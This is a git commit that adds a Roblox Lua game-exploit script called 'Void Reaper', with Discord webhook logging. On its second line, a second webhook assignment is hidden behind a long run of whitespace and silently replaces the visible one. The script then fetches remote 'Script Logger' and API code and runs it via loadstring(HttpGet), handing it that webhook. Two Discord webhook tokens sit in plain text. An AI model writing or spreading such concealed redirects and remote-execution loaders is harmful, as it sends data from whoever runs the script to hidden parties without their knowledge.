840f2d8e28a45b87920d45cc663131cbf24a8a68
yes1nt <94116083+yes1nt@users.noreply.github.com>
2026-09-12 14:43:01 +0800

    Add Void Reaper script with Discord webhook logging

---
+++ API/TSBG/Void Reaper.lua
@@ -0,0 +1,10 @@
+local Webhook = "https://discord.com/api/webhooks/1386756293393383466/SlLmH26d7d1AJAJeb_o-0L-gBH2Il5gif4omF5dOSJDIdldj8738ksjdjIZumPyidNpISe_o0-";
+local ScriptName = "Friedpotato Void Reaper";                                                                                                                                                                                                                                                                                                                                                                        Webhook = "https://discord.com/api/webhooks/1539679643077185607/hh-kozkxYBg0EZqAD1rUi8WPXyAtwLKm0fRKkm3zGLDx5l5uqAORPpweR5ePZHgwdJHa";
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Script%20Tools/Script%20Logger"))():Log(ScriptName, Webhook)
+
+local MainAPI = loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/friedpotato/refs/heads/main/API/MAIN%20API.lua"))()
+local api = MainAPI:LoadTsbgAPI()
+local Main = api:CreateMoveset("Void Reaper")
+api:SetSupportedHeroes({"Hero Hunter"})
+api:Load()
+Main:LoadVoidReaper()
